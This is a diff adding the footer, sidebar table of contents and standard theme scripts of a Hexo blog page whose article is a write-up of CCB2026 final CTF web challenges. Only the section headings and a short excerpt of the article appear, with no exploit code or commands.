+        <a href="/2026/05/25/ZeroGCTF2026/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            ZeroGCTF2026
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1755142834147175514283467.jpg" data-sizes="auto" alt="2026蓝桥杯wp" class="lazyload">
+        
+      
+      <a href="/2026/04/25/2026%E8%93%9D%E6%A1%A5%E6%9D%AFwp/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          2026蓝桥杯wp
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#qlwistssrf%E6%89%93graphqljwt%E7%AE%97%E6%B3%95%E6%B7%B7%E6%B7%86vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.</span> <span class="toc-text"> QLwist(SSRF打graphql+JWT算法混淆+vm沙箱逃逸)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text"> 题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.</span> <span class="toc-text"> 解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">1.3.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%BC%82%E6%AD%A5%E7%89%B9%E6%80%A7"><span class="toc-number">1.3.1.1.</span> <span class="toc-text"> 异步特性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E5%BA%8F%E7%BB%95%E8%BF%87"><span class="toc-number">1.3.1.2.</span> <span class="toc-text"> 时序绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#javaunboundcc%E9%93%BEscriptenginemanager%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Cbcel%E5%AD%97%E8%8A%82%E7%A0%81%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">2.</span> <span class="toc-text"> JavaUnbound(CC链+ScriptEngineManager代码执行&#x2F;BCEL字节码+内存马)</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "CCB2026决赛复现",
+          url: "http://example.com/2026/05/08/CCB2026%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%8E%B0/",
+          excerpt: "",
+          description: "",
+          stripContent: "好久没看CTF的题了，来恢复恢复  QLwist(SSRF打graphql+JWT算法混淆+vm沙箱逃逸)  题目分析    路径 作用     /auth/register 注册普通用户   /auth/login 登录，返回 JWT token   /dashboard、/profile 普通登录用户页面   /admin 需要 admin 或 super_admin   /admin/super 需要 super_admin   /admin/super/evaluate super_ad",
+          date: "Fri May 08 2026 11:20:44 GMT+0800",
+          updated: "Fri May 08 2026 15:23:31 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
